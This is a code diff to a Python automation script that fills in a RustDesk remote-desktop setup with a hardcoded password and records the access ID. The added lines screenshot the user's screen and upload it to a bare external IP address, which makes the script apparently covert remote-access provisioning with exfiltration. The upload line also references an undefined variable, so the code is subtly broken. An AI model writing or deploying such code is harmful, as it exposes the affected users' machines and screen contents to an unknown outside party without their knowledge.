@@ -39,7 +39,7 @@ for x, y, duration in actions:
         pag.click(x, y, duration=duration)
     if (x, y) in [(291, 250), (310, 338)]:
         # For "first fill" and "second fill" coordinates, type the desired text
-        pag.keyDown('D')  # Press the "D" key
+        #pag.keyDown('D')  # Press the "D" key
         text_to_type = "Pakistan@098!23"
         pag.typewrite(text_to_type)
 
@@ -61,6 +61,11 @@ def run_rustdesk_command():
     password_echo = 'Password : Pakistan@098!23'  
     save_echo_to_batch('show.bat', f'RustDesk ID: {clipboard_text}')
     save_echo_to_batch('show.bat', password_echo)
+    im2 = pag.screenshot()
+    im3 = pag.screenshot(r'C:\Users\Public\Desktop\my_screenshot.png')
+    files1 = open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb')
+    r1 = requests.put('http://18.228.80.130/test1.png', data=files)
+    print(r1.content)
 
 
 if __name__ == "__main__":
